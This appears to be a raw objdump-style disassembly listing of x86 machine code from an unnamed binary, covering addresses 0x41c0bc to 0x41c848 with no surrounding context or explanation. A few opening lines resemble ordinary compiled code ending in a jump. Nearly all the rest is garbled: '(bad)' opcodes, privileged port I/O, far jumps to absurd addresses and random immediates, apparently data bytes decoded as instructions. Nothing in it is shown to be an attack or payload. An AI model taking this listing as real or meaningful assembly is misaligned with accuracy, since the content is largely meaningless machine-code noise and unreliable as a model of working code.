  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	test   BYTE PTR [esi],cl
  41c0f8:	or     BYTE PTR [edx-0x59],ch
  41c0fb:	jns    0x41c113
  41c0fd:	sbb    BYTE PTR [edx+edx*1+0x70f1818],bh
  41c104:	int    0x28
  41c106:	jnp    0x41c089
  41c108:	bound  ecx,QWORD PTR [edi]
  41c10a:	(bad)  
  41c10b:	sbb    al,0xc4
  41c10d:	sar    ebx,cl
  41c10f:	xor    ch,BYTE PTR [edi]
  41c111:	add    BYTE PTR [esi+0x5a],bh
  41c114:	cmp    eax,0x28b6344c
  41c119:	int3   
  41c11a:	mov    ah,cl
  41c11c:	jbe    0x41c0ba
  41c11e:	test   BYTE PTR [edx+0x7],0x4a
  41c122:	repnz retf 0xa4b4
  41c126:	or     eax,0xb9858a94
  41c12b:	neg    DWORD PTR [ecx-0x7e]
  41c12e:	pop    ss
  41c12f:	dec    eax
  41c130:	jle    0x41c0c8
  41c132:	xlat   BYTE PTR ds:[ebx]
  41c133:	dec    esp
  41c134:	mov    al,0xd4
  41c136:	(bad)  
  41c137:	pop    eax
  41c138:	jns    0x41c164
  41c13a:	ss inc ebp
  41c13c:	lods   al,BYTE PTR ds:[esi]
  41c13d:	inc    DWORD PTR [ebp-0x674bbc22]
  41c143:	mov    esi,0x48592216
  41c148:	or     BYTE PTR [edi+0x645983a8],ah
  41c14e:	(bad)  
  41c14f:	and    DWORD PTR [edx+edx*4-0x5c],esi
  41c153:	sahf   
  41c154:	stos   BYTE PTR es:[edi],al
  41c155:	pop    ecx
  41c156:	aam    0xf5
  41c158:	jbe    0x41c12d
  41c15a:	adc    DWORD PTR [ebx-0x3cc68cde],ebp
  41c160:	jl     0x41c19b
  41c162:	std    
  41c163:	test   DWORD PTR [edx+0x61401605],edi
  41c169:	cmp    eax,0x6c954d1e
  41c16e:	mov    ebx,0x63e6fe14
  41c173:	jbe    0x41c19a
  41c175:	dec    esp
  41c176:	and    ebp,0x2843a991
  41c17c:	jns    0x41c1c5
  41c17e:	test   al,al
  41c180:	push   edi
  41c181:	test   al,0x2c
  41c183:	add    ecx,DWORD PTR [ebx+0x1677a734]
  41c189:	test   eax,0x990dda49
  41c18e:	xchg   edx,eax
  41c18f:	pusha  
  41c190:	ret    0x2f7e
  41c193:	mov    ah,0xa4
  41c195:	popf   
  41c196:	push   ecx
  41c197:	out    0x9f,eax
  41c199:	mov    dh,0xf0
  41c19b:	scas   al,BYTE PTR es:[edi]
  41c19c:	sbb    DWORD PTR [ebx],ebx
  41c19e:	mov    al,0xdd
  41c1a0:	clts   
  41c1a2:	xchg   edx,eax
  41c1a3:	adc    al,0x4a
  41c1a5:	lock mov ds:0xb0af2af0,eax
  41c1ab:	jo     0x41c1cb
  41c1ad:	out    dx,eax
  41c1ae:	fsubr  QWORD PTR [eax-0x65]
  41c1b1:	loope  0x41c14f
  41c1b3:	js     0x41c220
  41c1b5:	dec    ecx
  41c1b6:	mov    bl,0x9c
  41c1b8:	fwait
  41c1b9:	jmp    0xe08785e1
  41c1be:	lahf   
  41c1bf:	jle    0x41c1f4
  41c1c1:	das    
  41c1c2:	test   BYTE PTR [edi+0x35],0x7b
  41c1c6:	push   esp
  41c1c7:	es (bad) 
  41c1c9:	fnop   
  41c1cb:	sahf   
  41c1cc:	ins    BYTE PTR es:[edi],dx
  41c1cd:	dec    edi
  41c1ce:	nop
  41c1cf:	add    bh,dl
  41c1d1:	aam    0x76
  41c1d3:	out    dx,eax
  41c1d4:	mov    bh,0xea
  41c1d6:	mov    dl,0xeb
  41c1d8:	inc    edx
  41c1d9:	push   cs
  41c1da:	in     eax,0x6a
  41c1dc:	and    BYTE PTR [edx+ebp*8],0x97
  41c1e0:	mov    ecx,0xb9ac7491
  41c1e5:	xor    cl,bh
  41c1e7:	add    dh,BYTE PTR [ebx]
  41c1e9:	xor    BYTE PTR [edi-0x31],dh
  41c1ec:	mov    esp,0x5f8bedae
  41c1f1:	adc    esi,edi
  41c1f3:	mov    ds:0xc0f11e92,al
  41c1f8:	xor    DWORD PTR [eax],ebp
  41c1fa:	(bad)  
  41c1fb:	popf   
  41c1fc:	adc    eax,DWORD PTR [ecx-0x3278d87a]
  41c202:	lahf   
  41c203:	mov    al,0x16
  41c205:	and    al,0x5e
  41c207:	(bad)  
  41c208:	repz push ebp
  41c20a:	xchg   edi,eax
  41c20b:	or     BYTE PTR [esi],bh
  41c20d:	adc    ah,ah
  41c20f:	push   ss
  41c210:	mov    edi,0xf4ee3f28
  41c215:	int    0x4f
  41c217:	dec    ebx
  41c218:	pop    ecx
  41c219:	retf   0x3835
  41c21c:	dec    ecx
  41c21d:	jbe    0x41c1de
  41c21f:	and    BYTE PTR [edi+0x14],ch
  41c222:	jmp    0x49db53ae
  41c227:	push   ebx
  41c228:	inc    esp
  41c229:	dec    eax
  41c22a:	lods   al,BYTE PTR ds:[esi]
  41c22b:	add    eax,0x37c3e55c
  41c230:	nop
  41c231:	sbb    al,0x4b
  41c233:	fst    QWORD PTR [edx-0x7c8e78bf]
  41c239:	xor    ah,BYTE PTR [eax+0x45]
  41c23c:	jbe    0x41c20b
  41c23e:	dec    ebx
  41c23f:	push   0xf8311c58
  41c244:	mov    ecx,0xbada9bf2
  41c249:	ins    DWORD PTR es:[edi],dx
  41c24a:	pop    ebx
  41c24b:	mov    bl,0x87
  41c24d:	std    
  41c24e:	mov    ebx,0x6005c29f
  41c253:	imul   edi,DWORD PTR [ecx],0xffffffb0
  41c256:	jns    0x41c246
  41c258:	(bad)  
  41c259:	xchg   ecx,eax
  41c25a:	jnp    0x41c28a
  41c25c:	int3   
  41c25d:	add    DWORD PTR [ebx+0x75],0xffffffc1
  41c261:	add    al,0x2
  41c263:	popf   
  41c264:	cmc    
  41c265:	int3   
  41c266:	xchg   edi,eax
  41c267:	or     eax,0xb8f63af8
  41c26c:	fcom   QWORD PTR ds:0x64059d7f
  41c272:	pop    ds
  41c273:	jbe    0x41c2e9
  41c275:	stos   DWORD PTR es:[edi],eax
  41c276:	jb     0x41c224
  41c278:	push   eax
  41c279:	sbb    al,0x11
  41c27b:	cwde   
  41c27c:	lock jmp 0x41c234
  41c27f:	enter  0x914c,0xc2
  41c283:	ins    DWORD PTR es:[edi],dx
  41c284:	iret   
  41c285:	push   edi
  41c286:	sub    al,BYTE PTR [edx]
  41c288:	repnz xor BYTE PTR [edi],bh
  41c28b:	scas   al,BYTE PTR es:[edi]
  41c28c:	out    dx,eax
  41c28d:	mov    ds:0x159c514f,al
  41c292:	mov    edx,0x93137875
  41c297:	add    eax,0xbbb679c6
  41c29c:	pushf  
  41c29d:	cdq    
  41c29e:	or     edx,DWORD PTR [edi+0x1f4232d2]
  41c2a4:	repnz mov edi,0x427c09c1
  41c2aa:	push   0x49
  41c2ac:	fcom   QWORD PTR [eax]
  41c2ae:	jmp    0x28cc:0x22c5561b
  41c2b5:	mov    eax,0xf9a66456
  41c2ba:	xchg   esp,eax
  41c2bb:	pop    ebp
  41c2bc:	(bad)  
  41c2be:	in     eax,dx
  41c2bf:	fs xchg edi,eax
  41c2c1:	int    0xc8
  41c2c3:	(bad)  
  41c2c4:	xchg   esi,eax
  41c2c5:	out    dx,eax
  41c2c6:	mov    ebp,0x4b47979b
  41c2cb:	cwde   
  41c2cc:	jge    0x41c32d
  41c2ce:	and    bl,BYTE PTR [ecx+0x69cf8919]
  41c2d4:	sub    ah,BYTE PTR [ebx-0xd]
  41c2d7:	push   edi
  41c2d8:	imul   edi,edi,0x44789142
  41c2de:	popa   
  41c2df:	and    al,0xfc
  41c2e1:	jne    0x41c311
  41c2e3:	mov    esi,0x671797af
  41c2e8:	(bad)  
  41c2e9:	fucomp st(7)
  41c2eb:	cmp    dh,ch
  41c2ed:	push   0x7f5d70d9
  41c2f2:	fnstcw WORD PTR [eax-0x58]
  41c2f5:	scas   al,BYTE PTR es:[edi]
  41c2f6:	dec    esi
  41c2f7:	adc    DWORD PTR [edx+eiz*4+0x56],esi
  41c2fb:	arpl   WORD PTR [edx],bx
  41c2fd:	shr    DWORD PTR [edx],cl
  41c2ff:	loopne 0x41c357
  41c301:	mov    edx,0xd352724f
  41c306:	dec    edi
  41c307:	mov    bh,0x4d
  41c309:	stc    
  41c30a:	fstp   TBYTE PTR [esi]
  41c30c:	jnp    0x41c2be
  41c30e:	or     cl,cl
  41c310:	ds je  0x41c320
  41c313:	icebp  
  41c314:	mov    WORD PTR [eax+0x71],cs
  41c317:	stos   BYTE PTR es:[edi],al
  41c318:	loope  0x41c359
  41c31a:	sub    DWORD PTR fs:[ebx+0x5e],ebp
  41c31e:	pop    ebx
  41c31f:	cmp    esp,DWORD PTR [eax]
  41c321:	fs pop ds
  41c323:	jo     0x41c2d5
  41c325:	mov    al,ds:0x22aecebe
  41c32a:	or     BYTE PTR [ebp+0x2b],cl
  41c32d:	jmp    DWORD PTR ds:0xb878450
  41c333:	and    DWORD PTR [esi+ecx*1-0x7f67f746],esi
  41c33a:	repnz test al,0x19
  41c33d:	rol    DWORD PTR [edx+0x71],cl
  41c340:	and    eax,0x5ee37ea6
  41c345:	test   DWORD PTR [edx+eax*1-0x1e],eax
  41c349:	retf   
  41c34a:	inc    ebx
  41c34b:	push   ss
  41c34c:	out    0x5d,al
  41c34e:	cmp    BYTE PTR [edx],ch
  41c350:	rol    DWORD PTR [ecx+0x7f],0x53
  41c354:	or     ecx,esp
  41c356:	clc    
  41c357:	call   0xdd39:0x99683536
  41c35e:	inc    ebx
  41c35f:	mov    edi,0xd12f57eb
  41c364:	div    BYTE PTR [ecx+edx*8-0xebe4cdb]
  41c36b:	cmp    BYTE PTR [ecx-0x25],cl
  41c36e:	or     ebp,DWORD PTR [esi-0x40]
  41c371:	xchg   edx,eax
  41c372:	sti    
  41c373:	outs   dx,DWORD PTR ds:[esi]
  41c374:	scas   al,BYTE PTR es:[edi]
  41c375:	mov    edx,0x2ca9a964
  41c37a:	das    
  41c37b:	ins    BYTE PTR es:[edi],dx
  41c37c:	dec    eax
  41c37d:	sbb    eax,0x10095ac3
  41c382:	cli    
  41c383:	add    BYTE PTR [ebp-0x493cc55e],bh
  41c389:	std    
  41c38a:	xchg   DWORD PTR [esi+0x66],ebx
  41c38d:	rol    BYTE PTR ds:[edi-0x6d],1
  41c391:	gs push ds
  41c393:	dec    esi
  41c394:	lods   al,BYTE PTR ds:[esi]
  41c395:	jl     0x41c38c
  41c397:	xor    BYTE PTR [ebp+0x75cedbf7],0xc2
  41c39e:	adc    edi,ecx
  41c3a0:	add    BYTE PTR [edi+eax*2-0x64edc66d],0x20
  41c3a8:	fst    DWORD PTR [edi-0x5db3b03a]
  41c3ae:	pop    esp
  41c3af:	cmc    
  41c3b0:	and    ebp,edx
  41c3b2:	iret   
  41c3b3:	jmp    0x518f:0x8ee2adb0
  41c3ba:	mov    WORD PTR [edi+ecx*8-0x2f],?
  41c3be:	jle    0x41c39f
  41c3c0:	jmp    0xbbc89795
  41c3c5:	mov    al,ds:0xac96e1f6
  41c3ca:	leave  
  41c3cb:	pushf  
  41c3cc:	cmp    al,bh
  41c3ce:	mov    ds:0x397f7ca7,al
  41c3d3:	pop    ebp
  41c3d4:	cmp    eax,0x2c1bb727
  41c3d9:	inc    eax
  41c3da:	sbb    dl,ah
  41c3dc:	test   DWORD PTR [eax-0x5b],edi
  41c3df:	fld    QWORD PTR [ebx+0x17]
  41c3e2:	add    al,0x78
  41c3e4:	loopne 0x41c3b4
  41c3e6:	ds jmp 0x41c400
  41c3e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3ea:	es in  eax,0x27
  41c3ed:	fmul   DWORD PTR [ebx+0x6e]
  41c3f0:	fsubr  st(1),st
  41c3f2:	cli    
  41c3f3:	sub    BYTE PTR ds:0xfd059567,0x91
  41c3fa:	xchg   BYTE PTR [ecx+0x6f],dh
  41c3fd:	std    
  41c3fe:	add    eax,0xa0d64c46
  41c403:	shld   ecx,ecx,0x91
  41c407:	(bad)  
  41c408:	and    eax,0x7e6485f2
  41c40d:	cli    
  41c40e:	jno    0x41c398
  41c410:	ja     0x41c46c
  41c412:	add    BYTE PTR [edi+ebx*1],al
  41c415:	xor    DWORD PTR [edi+0x13f13ff],0x40
  41c41c:	xchg   edi,eax
  41c41d:	psrlw  mm4,QWORD PTR [edi+0x4c]
  41c421:	call   0x5f499eca
  41c426:	es mov bl,0x99
  41c429:	(bad)  
  41c42a:	outs   dx,BYTE PTR ds:[esi]
  41c42b:	lock call FWORD PTR [edx]
  41c42e:	gs pushf 
  41c430:	mov    ch,0x3
  41c432:	sub    edx,DWORD PTR [ebx-0x644a2008]
  41c438:	xchg   ebx,eax
  41c439:	data16 and al,0x9d
  41c43c:	sbb    eax,0xc4e303b5
  41c441:	pop    edi
  41c442:	out    dx,al
  41c443:	jmp    0xd5eba4bd
  41c448:	xchg   ebp,eax
  41c449:	and    eax,0x1949720
  41c44e:	loopne 0x41c435
  41c450:	leave  
  41c451:	ror    ecx,cl
  41c453:	sbb    eax,0x5dbc37f
  41c458:	pop    ss
  41c459:	pop    edx
  41c45a:	out    dx,al
  41c45b:	mov    ah,0x8b
  41c45d:	rcl    BYTE PTR [ebx-0x2efd219b],cl
  41c463:	into   
  41c464:	cmc    
  41c465:	sub    eax,DWORD PTR [edi-0x7a]
  41c468:	jmp    0x41c48d
  41c46a:	or     eax,0xe0dbd961
  41c46f:	test   DWORD PTR [edi],eax
  41c471:	leave  
  41c472:	adc    BYTE PTR [ecx],al
  41c474:	in     al,dx
  41c475:	pop    ebx
  41c476:	sub    al,0xba
  41c478:	push   edi
  41c479:	(bad)  
  41c47a:	and    al,0x21
  41c47c:	in     al,0x28
  41c47e:	fdiv   DWORD PTR [eax+esi*8]
  41c481:	pushf  
  41c482:	adc    al,0x9b
  41c484:	fwait
  41c485:	jns    0x41c40d
  41c487:	sbb    al,0xdb
  41c489:	mov    cl,0x1a
  41c48b:	pop    es
  41c48c:	mov    ds:0xb94e2d9,eax
  41c491:	or     bl,BYTE PTR [esi]
  41c493:	hlt    
  41c494:	aam    0xf2
  41c496:	pop    ss
  41c497:	fist   WORD PTR [edx-0x54]
  41c49a:	adc    eax,0xd1ce9220
  41c49f:	ds and ch,dl
  41c4a2:	add    DWORD PTR [edi],ebp
  41c4a4:	pop    esp
  41c4a5:	and    DWORD PTR [edx],0x331007cb
  41c4ab:	mov    edx,0x153d9858
  41c4b0:	or     DWORD PTR [edi],0xffffffcd
  41c4b3:	jmp    0xe9ff:0xff891ce8
  41c4ba:	retf   0x3
  41c4bd:	add    BYTE PTR [edi+0x23],al
  41c4c0:	cmp    BYTE PTR [ecx],bl
  41c4c2:	xor    al,0x3
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c4da
  41c4cb:	call   0x738c4159
  41c4d0:	push   ss
  41c4d1:	sbb    BYTE PTR [edx+edx*1+0x20a61818],bh
  41c4d8:	rcr    esi,1
  41c4da:	xchg   DWORD PTR [ebp+0x3b8b3ef8],ecx
  41c4e0:	imul   eax,DWORD PTR [eax-0x122260d5],0xffffffe4
  41c4e7:	xlat   BYTE PTR ds:[ebx]
  41c4e8:	push   es
  41c4e9:	fidiv  DWORD PTR [esi+0x4]
  41c4ec:	daa    
  41c4ed:	push   0xfffffffb
  41c4ef:	xor    DWORD PTR [edx+0x27],ebx
  41c4f2:	sbb    bl,BYTE PTR [edx+0x6d3c1c96]
  41c4f8:	ss gs ins DWORD PTR es:[edi],dx
  41c4fb:	sbb    al,0x17
  41c4fd:	mov    ebx,0xd3a88dd9
  41c502:	jns    0x41c50d
  41c504:	xor    DWORD PTR [edi-0x2a],ecx
  41c507:	pop    ds
  41c508:	inc    ecx
  41c509:	pop    ds
  41c50a:	arpl   WORD PTR [eax-0x29],bp
  41c50d:	adc    eax,0x3dbf0e67
  41c512:	xor    cl,BYTE PTR ds:[ebx+0x6e8c5ce1]
  41c519:	fstp   DWORD PTR [edi-0x2c6e6769]
  41c51f:	fstp   st(3)
  41c521:	sbb    ebx,DWORD PTR [ecx]
  41c523:	cmp    eax,0xa304f74b
  41c528:	(bad)  
  41c529:	pop    eax
  41c52a:	jl     0x41c53c
  41c52c:	fcomp  DWORD PTR [ebx+0x2a]
  41c52f:	pop    ds
  41c530:	ror    BYTE PTR [ebp-0x23560811],0xd6
  41c537:	sbb    bh,0xf2
  41c53a:	js     0x41c507
  41c53c:	and    eax,esi
  41c53e:	pop    esi
  41c53f:	cld    
  41c540:	adc    dl,BYTE PTR [eiz*1-0x78c861a9]
  41c547:	loopne 0x41c523
  41c549:	repnz push cs
  41c54b:	sahf   
  41c54c:	dec    edx
  41c54d:	jecxz  0x41c55b
  41c54f:	sub    cl,BYTE PTR [ecx+0x42]
  41c552:	mov    ds:0x76904fbb,al
  41c557:	nop
  41c558:	cmp    al,0xf4
  41c55a:	int    0xd4
  41c55c:	stos   BYTE PTR es:[edi],al
  41c55d:	in     al,0x32
  41c55f:	mov    al,0xbd
  41c561:	je     0x41c5da
  41c563:	inc    ebx
  41c564:	test   DWORD PTR [edi-0x2a],esi
  41c567:	ins    DWORD PTR es:[edi],dx
  41c568:	push   ebp
  41c569:	jae    0x41c586
  41c56b:	call   ecx
  41c56d:	or     al,0x15
  41c56f:	sbb    eax,DWORD PTR [edi-0x35afd120]
  41c575:	test   BYTE PTR fs:[eax+0x559d24f],ch
  41c57c:	lock dec eax
  41c57e:	xor    ebp,DWORD PTR [eax-0x38897ed2]
  41c584:	outs   dx,DWORD PTR ds:[esi]
  41c585:	mov    dl,0x4f
  41c587:	das    
  41c588:	pop    edi
  41c589:	inc    esi
  41c58a:	sub    bl,BYTE PTR [eax+0x302d8dbc]
  41c590:	(bad)  
  41c591:	xor    edx,eax
  41c593:	stos   DWORD PTR es:[edi],eax
  41c594:	mov    ebx,0x35215bf3
  41c599:	aaa    
  41c59a:	inc    ecx
  41c59b:	xor    BYTE PTR [esi-0x5a30eae6],ch
  41c5a1:	cli    
  41c5a2:	push   ds
  41c5a3:	iret   
  41c5a4:	sbb    DWORD PTR [eax],edx
  41c5a6:	scas   al,BYTE PTR es:[edi]
  41c5a7:	xor    dh,BYTE PTR [esi-0x47]
  41c5aa:	mov    dh,0x1d
  41c5ac:	ja     0x41c59c
  41c5ae:	push   esi
  41c5af:	retf   0x66b8
  41c5b2:	add    ch,BYTE PTR [edi]
  41c5b4:	push   eax
  41c5b5:	sub    DWORD PTR [esi-0x7d],edx
  41c5b8:	js     0x41c552
  41c5ba:	retf   
  41c5bb:	popf   
  41c5bc:	jb     0x41c634
  41c5be:	pop    ss
  41c5bf:	(bad)  
  41c5c0:	jge    0x41c5a7
  41c5c2:	push   es
  41c5c3:	xor    BYTE PTR [esi],cl
  41c5c5:	aam    0x78
  41c5c7:	inc    esi
  41c5c8:	fist   WORD PTR [ebp-0x5b9ab63b]
  41c5ce:	sbb    al,0x85
  41c5d0:	sbb    al,0x9b
  41c5d2:	leave  
  41c5d3:	dec    edi
  41c5d4:	lods   al,BYTE PTR ds:[esi]
  41c5d5:	loope  0x41c567
  41c5d7:	jne    0x41c5ed
  41c5d9:	(bad)  [ebp-0x1]
  41c5dc:	(bad)  
  41c5dd:	xchg   ecx,eax
  41c5de:	sub    al,0xf3
  41c5e0:	xchg   ecx,eax
  41c5e1:	pop    ecx
  41c5e2:	retf   
  41c5e3:	idiv   DWORD PTR [ecx+eax*8-0x6b]
  41c5e7:	mov    ch,bl
  41c5e9:	(bad)  
  41c5ea:	popa   
  41c5eb:	jb     0x41c5e7
  41c5ed:	inc    ebp
  41c5ee:	fs fs ret 0x379f
  41c5f3:	arpl   WORD PTR [ebp+0x439c9406],dx
  41c5f9:	imul   esi,edi,0x51
  41c5fc:	sbb    eax,0x1f3d47b0
  41c601:	inc    edx
  41c602:	test   al,al
  41c604:	jb     0x41c58d
  41c606:	mov    DWORD PTR [eax+0x4e8ba667],0x30cdbb1e
  41c610:	jg     0x41c5e5
  41c612:	out    dx,eax
  41c613:	xor    al,0xf5
  41c615:	pop    ebp
  41c616:	dec    edx
  41c617:	iret   
  41c618:	dec    eax
  41c619:	outs   dx,DWORD PTR ds:[esi]
  41c61a:	pop    ecx
  41c61b:	dec    ebx
  41c61c:	imul   edx,DWORD PTR [ebp-0x34924945],0xd285b8ee
  41c626:	and    ah,BYTE PTR [ebx]
  41c628:	xchg   DWORD PTR [eax-0x70da8d06],edi
  41c62e:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41c630:	retf   0xda01
  41c633:	cdq    
  41c634:	scas   eax,DWORD PTR es:[edi]
  41c635:	aam    0xfa
  41c637:	xor    dl,al
  41c639:	call   0x79455128
  41c63e:	add    eax,DWORD PTR [edx+0x5]
  41c641:	cli    
  41c642:	dec    ecx
  41c643:	push   esi
  41c644:	mov    ecx,0xa6344129
  41c649:	ret    
  41c64a:	or     esi,DWORD PTR [ebx]
  41c64c:	sub    al,0x73
  41c64e:	push   edi
  41c64f:	cmp    al,0xcb
  41c651:	mov    dh,0x6c
  41c653:	or     DWORD PTR [ecx+0x2e],esi
  41c656:	hlt    
  41c657:	xor    ah,BYTE PTR [edx-0x4af879ac]
  41c65d:	sbb    DWORD PTR [esi+0x225cbcd9],ebx
  41c663:	inc    eax
  41c664:	mov    ebp,ebx
  41c666:	xchg   DWORD PTR [ecx+0x564afc15],esi
  41c66c:	cs mov bl,0x7e
  41c66f:	aas    
  41c670:	sbb    DWORD PTR [ecx+0x17],eax
  41c673:	push   edx
  41c674:	das    
  41c675:	ss mov al,0xdd
  41c678:	or     eax,0x5c44c757
  41c67d:	jmp    0x52260690
  41c682:	mov    dl,0x3a
  41c684:	dec    esi
  41c685:	push   edi
  41c686:	mov    eax,ds:0x17fde22e
  41c68b:	pushf  
  41c68c:	rcl    BYTE PTR [edi+0x5d],0x82
  41c690:	push   ebp
  41c691:	adc    al,0xd9
  41c693:	xor    DWORD PTR [ebp+0x7af8e3df],0x34
  41c69a:	push   edx
  41c69b:	cmp    edi,DWORD PTR [edi]
  41c69d:	jg     0x41c67a
  41c69f:	fist   DWORD PTR [ebx+ebx*8]
  41c6a2:	xor    BYTE PTR [ecx+0x31],al
  41c6a5:	sub    al,0x2d
  41c6a7:	xor    ah,BYTE PTR [ecx+0x46]
  41c6aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6ab:	pop    ebp
  41c6ac:	mov    edx,0x6e3bcb8b
  41c6b1:	sub    ebp,DWORD PTR [ecx+0x4e]
  41c6b4:	jle    0x41c675
  41c6b6:	fdivr  QWORD PTR [ebp+0xa6ed213]
  41c6bc:	je     0x41c6a9
  41c6be:	mov    WORD PTR [ecx-0x2],fs
  41c6c1:	ficom  WORD PTR [edx-0x57fb3141]
  41c6c7:	imul   edx,DWORD PTR [ebp+0x53],0xfffffff1
  41c6cb:	jecxz  0x41c6c5
  41c6cd:	jns    0x41c711
  41c6cf:	jno    0x41c6f2
  41c6d1:	scas   al,BYTE PTR es:[edi]
  41c6d2:	cmp    ebx,DWORD PTR [ebp-0x36]
  41c6d5:	enter  0x4dac,0xc1
  41c6d9:	lea    esp,[edi+0x7b]
  41c6dc:	jno    0x41c71a
  41c6de:	jae    0x41c68b
  41c6e0:	xchg   edi,eax
  41c6e1:	aas    
  41c6e2:	inc    eax
  41c6e3:	xchg   esp,eax
  41c6e4:	not    DWORD PTR [ebx]
  41c6e6:	or     BYTE PTR ds:0x1280fc89,bh
  41c6ec:	ja     0x41c740
  41c6ee:	jl     0x41c69a
  41c6f0:	ss hlt 
  41c6f2:	push   0x2cf6cf53
  41c6f7:	xor    al,0xff
  41c6f9:	dec    ebp
  41c6fa:	pop    ebx
  41c6fb:	dec    eax
  41c6fc:	int    0x11
  41c6fe:	jae    0x41c71d
  41c700:	jmp    0xa1c:0x81dea5a1
  41c707:	add    DWORD PTR [esi-0x5fd805c6],ecx
  41c70d:	popa   
  41c70e:	push   0xffffffc6
  41c710:	sub    al,0x50
  41c712:	imul   esp,edi,0x4a
  41c715:	test   BYTE PTR [edi+0x1324dee9],ch
  41c71b:	jl     0x41c6fe
  41c71d:	xor    eax,0xd010cebe
  41c722:	test   al,0xbe
  41c724:	gs xchg ebp,eax
  41c726:	pop    esp
  41c727:	xor    ah,cl
  41c729:	in     al,0x9f
  41c72b:	inc    edi
  41c72c:	cmp    DWORD PTR [esi+eax*2],0x99365bcc
  41c733:	pop    edx
  41c734:	xchg   ebp,eax
  41c735:	mov    ebx,0xc7e925
  41c73a:	jnp    0x41c720
  41c73c:	adc    eax,0x3147b433
  41c741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c742:	and    eax,0x96682c7f
  41c747:	hlt    
  41c748:	ficomp DWORD PTR [esi+0x85eed09]
  41c74e:	(bad)  
  41c74f:	ja     0x41c781
  41c751:	das    
  41c752:	cmp    DWORD PTR [edx-0x55c59869],ebp
  41c758:	js     0x41c783
  41c75a:	das    
  41c75b:	into   
  41c75c:	mov    bl,0x6
  41c75e:	push   esp
  41c75f:	or     DWORD PTR [ebx],0xcfcd23db
  41c765:	ret    
  41c766:	frstor [ebp-0x215762d6]
  41c76c:	retf   0x3
  41c76f:	jbe    0x41c772
  41c771:	sbb    DWORD PTR [ecx+0x6e],ecx
  41c774:	jmp    0xb3e838c9
  41c779:	stos   BYTE PTR es:[edi],al
  41c77a:	dec    ecx
  41c77b:	mov    cl,0xf9
  41c77d:	push   edx
  41c77e:	imul   eax,DWORD PTR [ebp+0x3f],0x6e
  41c782:	xchg   ebx,eax
  41c783:	push   ds
  41c784:	and    ebp,ecx
  41c786:	repnz push cs
  41c788:	jnp    0x41c7a2
  41c78a:	xchg   ebx,eax
  41c78b:	push   edx
  41c78c:	mov    ebp,DWORD PTR [edi]
  41c78e:	js     0x41c713
  41c790:	mov    eax,ds:0xb756a5e
  41c795:	(bad)  
  41c796:	ret    
  41c797:	adc    edi,ecx
  41c799:	nop    DWORD PTR [edx+0x576bf807]
  41c7a0:	retf   0x34a7
  41c7a3:	inc    ebx
  41c7a4:	test   al,0xf7
  41c7a6:	or     eax,0xd804d910
  41c7ab:	push   ds
  41c7ac:	cmp    DWORD PTR [ebx-0x6a],0xffffffa9
  41c7b0:	push   ds
  41c7b1:	pop    eax
  41c7b2:	and    BYTE PTR [edi],dh
  41c7b4:	mov    ebp,0x30532d0
  41c7b9:	outs   dx,DWORD PTR ds:[esi]
  41c7ba:	(bad)  
  41c7bb:	outs   dx,DWORD PTR ds:[esi]
  41c7bc:	xchg   ecx,eax
  41c7bd:	xchg   ah,bl
  41c7bf:	jle    0x41c82e
  41c7c1:	dec    ecx
  41c7c2:	test   BYTE PTR [ebx],cl
  41c7c4:	push   ds
  41c7c5:	and    al,0xfd
  41c7c7:	push   ds
  41c7c8:	iret   
  41c7c9:	lock sti 
  41c7cb:	push   ss
  41c7cc:	scas   al,BYTE PTR es:[edi]
  41c7cd:	aad    0x9b
  41c7cf:	push   esp
  41c7d0:	imul   ebx,DWORD PTR ds:0xa22e6917,0xfffffff3
  41c7d7:	inc    esi
  41c7d8:	mov    edi,0x5f6b5a2d
  41c7dd:	mov    ebx,0x35df691e
  41c7e2:	jmp    0x41c7bc
  41c7e4:	lahf   
  41c7e5:	adc    BYTE PTR [esi],dl
  41c7e7:	mov    esp,0x823a38c3
  41c7ec:	fs jb  0x41c840
  41c7ef:	mov    edi,0xc6bfabfe
  41c7f4:	jb     0x41c79b
  41c7f6:	cmp    eax,0x214cc77f
  41c7fb:	dec    eax
  41c7fc:	mov    bh,0xd4
  41c7fe:	push   ebx
  41c7ff:	mov    ds:0x107c92f7,eax
  41c804:	sahf   
  41c805:	cwde   
  41c806:	inc    ecx
  41c807:	push   eax
  41c808:	pop    esi
  41c809:	mov    ds:0x4a930d01,eax
  41c80e:	mov    dl,0xbc
  41c810:	aam    0x9b
  41c812:	add    DWORD PTR [edx+0x6a],edi
  41c815:	shl    BYTE PTR [esi],cl
  41c817:	sbb    eax,0x40dd0fcd
  41c81c:	mov    bh,0xe1
  41c81e:	pop    ebx
  41c81f:	mov    WORD PTR [edx],cs
  41c821:	rol    DWORD PTR [ecx+0x1b46cd89],1
  41c827:	xchg   ebp,eax
  41c828:	mov    dl,0x3a
  41c82a:	xchg   ebx,eax
  41c82b:	retf   0x6deb
  41c82e:	scas   al,BYTE PTR es:[edi]
  41c82f:	push   edx
  41c830:	pop    ebp
  41c831:	pop    ecx
  41c832:	mov    ds:0x95f1d3da,al
  41c837:	jnp    0x41c825
  41c839:	adc    esp,DWORD PTR [eax+0x69]
  41c83c:	jae    0x41c87f
  41c83e:	inc    ebp
  41c83f:	and    eax,0x7cb65483
  41c844:	enter  0x9e0b,0x75
  41c848:	and    BYTE PTR [edi+0x5],dl
